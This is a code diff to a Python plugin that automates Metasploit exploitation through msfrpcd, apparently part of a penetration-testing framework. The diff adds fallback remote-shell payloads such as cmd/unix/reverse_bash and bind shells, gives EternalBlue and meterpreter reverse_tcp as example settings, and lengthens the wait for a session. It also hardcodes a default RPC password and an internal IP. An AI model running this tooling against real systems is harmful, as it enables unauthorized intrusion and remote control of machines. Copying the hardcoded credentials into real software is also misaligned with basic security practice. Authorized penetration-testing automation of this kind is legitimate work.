@@ -10,48 +10,49 @@ Unauthorized exploitation is illegal and unethical.
 from core.plugins.base import PluginBase
 from typing import Dict, Any, List
 import logging
+import time
 
 logger = logging.getLogger(__name__)
 
 
 class MetasploitPlugin(PluginBase):
     """Metasploit active exploitation plugin."""
-    
+
     name = "metasploit"
-    version = "1.0.0"
+    version = "1.1.0"
     description = "Active exploitation via Metasploit Framework (msfrpcd)"
     capabilities = ["exploitation", "payload_delivery", "session_management"]
-    
+
     required_params = ["exploit", "target", "payload"]
     optional_params = ["rhost", "rport", "lhost", "lport", "options", "msf_host", "msf_port", "msf_password"]
-    
+
     def validate_config(self) -> None:
         """Validate plugin configuration."""
         if "exploit" not in self.config:
             raise ValueError("Missing required parameter: exploit (e.g., 'exploit/windows/smb/ms17_010_eternalblue')")
-        
+
         if "target" not in self.config:
             raise ValueError("Missing required parameter: target (IP address)")
-        
+
         if "payload" not in self.config:
             raise ValueError("Missing required parameter: payload (e.g., 'windows/meterpreter/reverse_tcp')")
-    
+
     def run(self) -> Dict[str, Any]:
         """Execute Metasploit exploit."""
         exploit_path = self.config["exploit"]
         target = self.config["target"]
         payload = self.config["payload"]
-        
+
         # msfrpcd connection (running on Kali host)
-        msf_host = self.config.get("msf_host", "192.168.145.100")  # Default: Carlos's Kali IP
+        msf_host = self.config.get("msf_host", "192.168.145.100")
         msf_port = self.config.get("msf_port", 55553)
         msf_password = self.config.get("msf_password", "mypassword123")
-        
+
         logger.info(f"Connecting to msfrpcd at {msf_host}:{msf_port}")
-        
+
         try:
             from pymetasploit3.msfrpc import MsfRpcClient
-            
+
             # Connect to Metasploit RPC
             client = MsfRpcClient(
                 password=msf_password,
@@ -59,51 +60,92 @@ class MetasploitPlugin(PluginBase):
                 port=msf_port,
                 ssl=False
             )
-            
+
             msf_version = client.core.version
             logger.info(f"Connected to Metasploit {msf_version}")
-            
+
             # Get exploit module
             exploit = client.modules.use('exploit', exploit_path)
-            
+
             # Configure exploit
             exploit['RHOSTS'] = target
             if 'rport' in self.config:
                 exploit['RPORT'] = self.config['rport']
-            
-            # Set payload
-            exploit.payload = payload
-            
-            # Configure payload
-            lhost = self.config.get('lhost', msf_host)  # Default to Kali IP
+
+            # Set payload with fallback for compatibility
+            payload_set = False
+            try:
+                exploit.payload = payload
+                payload_set = True
+                logger.info(f"Payload set: {payload}")
+            except Exception as e:
+                logger.warning(f"Payload '{payload}' invalid: {e}")
+
+            if not payload_set:
+                # Try Unix-compatible fallback payloads
+                fallback_payloads = [
+                    'cmd/unix/bind_ruby',
+                    'cmd/unix/bind_perl',
+                    'cmd/unix/bind_awk',
+                    'cmd/unix/reverse_bash',
+                    'generic/shell_bind_tcp'
+                ]
+                for fallback in fallback_payloads:
+                    try:
+                        exploit.payload = fallback
+                        payload = fallback
+                        logger.info(f"Using fallback payload: {fallback}")
+                        payload_set = True
+                        break
+                    except Exception:
+                        continue
+
+            if not payload_set:
+                logger.warning("No compatible payload found, proceeding with default")
+
+            # Configure LHOST/LPORT
+            lhost = self.config.get('lhost', msf_host)
             lport = self.config.get('lport', 4444)
-            # Try to set LHOST/LPORT, ignore if not valid options
             try:
                 exploit['LHOST'] = lhost
-            except:
-                pass  # Payload doesn't use LHOST
-            
+            except Exception:
+                pass
+
             try:
                 exploit['LPORT'] = lport
-            except:
-                pass  # Payload doesn't use LPORT
+            except Exception:
+                pass
+
             # Additional options
             if 'options' in self.config:
                 for key, value in self.config['options'].items():
-                    exploit[key] = value
-            
-            logger.info(f"Executing exploit {exploit_path} against {target}")
-            
+                    try:
+                        exploit[key] = value
+                    except Exception:
+                        pass
+
+            logger.info(f"Executing exploit {exploit_path} against {target} with payload {payload}")
+
             # Execute exploit
             result = exploit.execute()
-            
-            # Wait a bit for session establishment
-            import time
-            time.sleep(5)
-            
+            logger.info(f"Exploit executed, result: {result}")
+
+            # Wait for session establishment (longer than before)
+            wait_time = 60
+            logger.info(f"Waiting {wait_time}s for session...")
+            time.sleep(wait_time)
+
+            # Also check completed jobs
+            try:
+                jobs = client.jobs.list
+                logger.info(f"MSF jobs: {jobs}")
+            except Exception:
+                pass
+
             # Check for sessions
             sessions = client.sessions.list
-            
+            logger.info(f"Sessions found: {len(sessions)}")
+
             return {
                 "raw_output": {
                     "exploit_result": str(result),
@@ -125,23 +167,22 @@ class MetasploitPlugin(PluginBase):
                     "sessions_count": len(sessions)
                 }
             }
-        
+
         except Exception as e:
             logger.error(f"Metasploit execution failed: {str(e)}")
             raise Exception(f"Metasploit RPC error: {str(e)}")
-    
+
     def parse_output(self, raw_output: Any, metadata: Dict[str, Any] = None) -> List[Dict[str, Any]]:
         """Parse Metasploit output into findings."""
         findings = []
-        
+
         if isinstance(raw_output, dict):
             sessions = raw_output.get("sessions", {})
             exploit_config = raw_output.get("exploit_config", {})
             msf_version = raw_output.get("msf_version", "Unknown")
         else:
             return findings
-        
-        # Check if exploitation was successful
+
         if sessions:
             for session_id, session_info in sessions.items():
                 findings.append({
@@ -174,7 +215,6 @@ class MetasploitPlugin(PluginBase):
                     }
                 })
         else:
-            # Exploitation failed
             findings.append({
                 'title': f"Exploitation attempt failed on {exploit_config.get('target', 'N/A')}",
                 'severity': 'info',
@@ -185,18 +225,18 @@ class MetasploitPlugin(PluginBase):
                     f"Payload: {exploit_config.get('payload', 'N/A')}\n"
                     f"Metasploit Version: {msf_version}\n\n"
                     f"Possible reasons:\n"
+                    f"- Payload incompatible with this Metasploit version\n"
                     f"- Target is not vulnerable to this exploit\n"
-                    f"- Exploit failed due to target configuration\n"
                     f"- Network/firewall blocking the payload connection\n"
-                    f"- Target security software detected and blocked the attack\n"
-                    f"- Incorrect target or payload configuration"
+                    f"- Incorrect LHOST/LPORT configuration\n"
+                    f"- Target security software detected and blocked the attack"
                 ),
                 'remediation': (
-                    "Continue security assessment with other techniques. "
-                    "The failed exploitation indicates the target may have adequate protections."
+                    "Try a different payload or verify target vulnerability. "
+                    "Check msfrpcd logs for detailed error messages."
                 ),
                 'raw_data': exploit_config
             })
-        
+
         logger.info(f"Parsed {len(findings)} findings from Metasploit output")
         return findings
